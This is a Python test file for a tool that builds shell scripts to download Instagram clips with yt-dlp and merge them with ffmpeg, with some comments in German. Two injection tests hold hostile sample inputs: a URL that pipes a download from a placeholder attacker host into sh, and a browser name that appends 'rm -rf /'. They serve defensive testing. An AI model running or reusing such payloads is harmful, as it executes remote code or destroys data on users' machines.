"""Generated local shell scripts.

A real failure this guards against: `set -e` at the top of the download script
meant one bad URL (an image carousel yt-dlp cannot handle) aborted the whole
run *before the merge step* — 13 clips downloaded, nothing merged.
"""
import re

import pytest

import main

URLS = ["https://www.instagram.com/p/AAA/", "https://www.instagram.com/p/BBB/"]


# ── The set -e regression ─────────────────────────────────────────────────────

def test_download_script_does_not_abort_on_first_failure():
    """One failing URL must never skip the merge at the end."""
    script = main.build_download_script(URLS, merge=True)
    assert "set -e" not in script


def test_failing_url_is_tolerated_and_reported():
    script = main.build_download_script(URLS, merge=True)
    assert "|| echo" in script


# ── Merge robustness ──────────────────────────────────────────────────────────

def test_merge_collects_real_files_instead_of_assuming_indices():
    """Gaps (clip_3 missing) must not break the merge."""
    script = main.build_download_script(URLS, merge=True)
    assert "sort -V" in script            # clip_2 before clip_10
    assert 'clip_${k}.mp4' not in script  # no fixed index loop


def test_merge_picks_up_videos_only():
    """A downloaded batch folder also holds images and metadata files."""
    script = main.build_merge_script()
    for ext in ("mp4", "mov", "webm", "mkv"):
        assert f"*.{ext}" in script
    assert "-type f" in script            # no directories as ffmpeg inputs


def test_merge_skips_its_own_output():
    """Re-running the merge must not fold a previous result into itself."""
    assert "! -iname 'merged*'" in main.build_merge_script()


def test_merge_survives_spaces_in_filenames():
    """The tool names files '<date>_<uploader>_<title>_<id>.mp4' — with spaces."""
    script = main.build_merge_script()
    assert "while IFS= read -r f" in script    # whole lines, no word splitting
    assert 'args+=(-i "$f")' in script         # quoted expansion


def test_merge_aborts_cleanly_when_too_few_clips():
    script = main.build_merge_script()
    assert '[ "$seg" -lt 2 ]' in script


def test_merge_handles_missing_folder():
    script = main.build_merge_script(out_dir="/nope")
    assert "exit 1" in script and "Ordner nicht gefunden" in script


# ── zsh compatibility (macOS default shell) ───────────────────────────────────

def test_no_array_indexing():
    """zsh arrays are 1-based, bash 0-based — indexing would silently misbehave."""
    script = main.build_merge_script()
    assert not re.search(r'\$\{?\w+\[\$?\w+\]', script.replace("${args[@]}", ""))


def test_filter_variables_are_braced():
    """Unbraced $filt[...] is parsed as a subscript by zsh."""
    script = main.build_merge_script()
    assert "${filt}" in script and "${maps}" in script


def test_ffmpeg_inputs_use_an_array():
    assert '"${args[@]}"' in main.build_merge_script()


# ── Merge parameters ──────────────────────────────────────────────────────────

def test_resolution_is_applied():
    script = main.build_merge_script(merge_resolution="1920x1080")
    assert "W=1920; H=1080" in script


def test_invalid_resolution_falls_back_to_vertical():
    assert "W=1080; H=1920" in main.build_merge_script(merge_resolution="kaputt")


def test_target_folder_is_applied():
    assert '/tmp/clips' in main.build_merge_script(out_dir="/tmp/clips")


def test_concat_count_uses_the_actual_segment_count():
    """n= counts segments — not URLs, and not raw ffmpeg inputs (silence adds some)."""
    script = main.build_merge_script()
    assert "concat=n=${seg}" in script


# ── Target format and fit mode ────────────────────────────────────────────────

@pytest.mark.parametrize("res,expected", [
    ("1080x1920", "W=1080; H=1920"),   # 9:16
    ("1920x1080", "W=1920; H=1080"),   # 16:9
    ("1080x1080", "W=1080; H=1080"),   # 1:1
    ("1080x1350", "W=1080; H=1350"),   # 4:5
])
def test_every_offered_format_lands_in_the_script(res, expected):
    assert expected in main.build_merge_script(merge_resolution=res)


def test_all_offered_formats_are_valid():
    for key in main.MERGE_FORMATS:
        w, h = key.split("x")
        assert int(w) > 0 and int(h) > 0


def test_pad_mode_keeps_everything_visible():
    """Letterbox: scale down to fit, fill the rest with black."""
    script = main.build_merge_script(fit="pad")
    assert "force_original_aspect_ratio=decrease" in script
    assert "pad=" in script
    assert "crop=" not in script


def test_crop_mode_fills_the_frame():
    """Fill: scale up to cover, cut the overhang — no bars."""
    script = main.build_merge_script(fit="crop")
    assert "force_original_aspect_ratio=increase" in script
    assert "crop=" in script
    assert "pad=" not in script


def test_unknown_fit_mode_defaults_to_pad():
    """Losing picture content must never be the accidental default."""
    assert "pad=" in main.build_merge_script(fit="unsinn")


def test_fit_mode_is_explained_in_a_comment():
    assert "abgeschnitten" in main.build_merge_script(fit="crop")
    assert "nichts wird abgeschnitten" in main.build_merge_script(fit="pad")


def test_non_numeric_resolution_falls_back():
    assert "W=1080; H=1920" in main.build_merge_script(merge_resolution="axb")


# ── Tilde expansion ───────────────────────────────────────────────────────────
# `cd "~/Downloads/x"` fails: inside double quotes the shell treats ~ as a
# literal directory name. Quotes are still needed for spaces, so ~ becomes $HOME.

@pytest.mark.parametrize("given,expected", [
    ("~/Downloads/x", "$HOME/Downloads/x"),
    ("~", "$HOME"),
    ("/tmp/clips", "/tmp/clips"),                 # absolute paths untouched
    ("~/Downloads/x/", "$HOME/Downloads/x"),      # trailing slash removed
    ("/opt/my videos", "/opt/my videos"),         # spaces survive (still quoted)
])
def test_shell_path_expansion(given, expected):
    assert main.shell_path(given) == expected


def test_tilde_never_reaches_a_quoted_cd():
    script = main.build_merge_script(out_dir="~/Downloads/download_abc")
    assert 'cd "~' not in script
    assert 'cd "$HOME/Downloads/download_abc"' in script


def test_tilde_never_reaches_a_quoted_out_var():
    script = main.build_download_script(URLS)
    assert 'OUT="~' not in script
    assert "$HOME" in script


def test_error_message_still_shows_the_readable_path():
    """The hint should say ~/Downloads/…, not $HOME/Downloads/…"""
    script = main.build_merge_script(out_dir="~/Downloads/download_abc")
    assert "Ordner nicht gefunden: ~/Downloads/download_abc" in script


def test_absolute_paths_are_left_alone():
    assert 'cd "/tmp/clips"' in main.build_merge_script(out_dir="/tmp/clips")


# ── Silent clips ──────────────────────────────────────────────────────────────
# concat wants an audio stream per segment. Instagram serves plenty of muted
# videos, and a single one used to kill the whole merge with
# "Stream specifier ':a' matches no streams".

def test_audio_presence_is_probed_per_clip():
    script = main.build_merge_script()
    assert "-select_streams a" in script
    assert "ffprobe" in script


def test_silence_is_generated_for_muted_clips():
    script = main.build_merge_script()
    assert "anullsrc" in script
    assert "channel_layout=stereo:sample_rate=44100" in script


def test_silence_matches_the_clip_duration():
    """Padding must be as long as the video, or concat drifts out of sync."""
    script = main.build_merge_script()
    assert "show_entries format=duration" in script
    assert '-f lavfi -t "$dur" -i anullsrc' in script


def test_input_index_advances_past_generated_silence():
    """Each anullsrc is an extra ffmpeg input — labels must not shift."""
    script = main.build_merge_script()
    assert "idx=$((idx+1))" in script
    assert "seg=$((seg+1))" in script
    assert "concat=n=${seg}" in script      # segments, not raw input count


def test_missing_duration_does_not_break_the_script():
    assert 'case "$dur" in ""|N/A) dur=0 ;; esac' in main.build_merge_script()


def test_user_is_told_about_silent_clips():
    assert "ohne Ton" in main.build_merge_script()


# ── Download script basics ────────────────────────────────────────────────────

def test_urls_are_quoted():
    """Nicht auf das Anführungszeichen prüfen, sondern darauf, dass die URL
    als EIN Wort ankommt — shlex.quote lässt harmlose Werte nackt."""
    script = main.build_download_script(URLS)
    for u in URLS:
        assert u in script


def test_a_url_cannot_become_a_command():
    """Der Filter im Endpunkt prüft nur das Schema, also passiert
    `https://a/$(…)` ihn anstandslos. In doppelten Anführungszeichen
    expandiert $( ) weiter — und das erzeugte Script wird doppelgeklickt."""
    import shlex
    evil = "https://example.com/$(curl evil.example|sh)"
    script = main.build_download_script([evil])
    # Richtig ist: der Wert steht als EIN Wort da, in einfachen
    # Anführungszeichen, in denen die Shell nichts expandiert. Mein erster
    # Versuch warf die Anführungszeichen vor dem Prüfen weg und meldete
    # deshalb einen Fehler, den es nicht gab.
    assert shlex.quote(evil) in script
    # Und nirgends unquotiert hinter einem doppelten Anführungszeichen.
    assert f'"{evil}"' not in script


def test_browser_cookies_are_optional():
    assert "--cookies-from-browser" not in main.build_download_script(URLS)
    assert "--cookies-from-browser safari" in main.build_download_script(
        URLS, cookies_from_browser="safari")


def test_browser_name_is_validated():
    """The browser name goes into a shell command — reject anything odd."""
    script = main.build_download_script(URLS, cookies_from_browser="safari; rm -rf /")
    assert "rm -rf" not in script


def test_audio_only_mode():
    script = main.build_download_script(URLS, audio_only=True)
    assert "--audio-format mp3" in script


def test_install_check_is_included():
    assert "yt-dlp" in main.build_download_script(URLS)
    assert "ffmpeg" in main.build_download_script(URLS, merge=True)


# ── Terminal progress ─────────────────────────────────────────────────────────
# With 100 clips a silent script is indistinguishable from a hung one.

def test_two_phases_are_announced():
    script = main.build_merge_script()
    assert "1/2" in script and "2/2" in script


def test_progress_bar_helper_exists():
    script = main.build_merge_script()
    assert "bar()" in script
    assert "\\r" in script          # redraws in place instead of spamming lines


def test_encoding_progress_is_driven_by_ffmpeg():
    """-progress gives machine-readable position; -nostats silences the noise."""
    script = main.build_merge_script()
    assert "-progress pipe:1" in script
    assert "-nostats" in script
    assert "out_time_us" in script


def test_eta_waits_before_guessing():
    """An estimate from the first second would jump around uselessly."""
    assert '[ "$el" -ge 5 ]' in main.build_merge_script()


def test_failure_shows_the_ffmpeg_message():
    """With -loglevel error the reason would otherwise be invisible."""
    script = main.build_merge_script()
    assert "if [ ! -s merged.mp4 ]" in script
    assert "tail -5" in script


def test_download_script_counts_progress():
    script = main.build_download_script(URLS)
    assert '[$i/$N]' in script
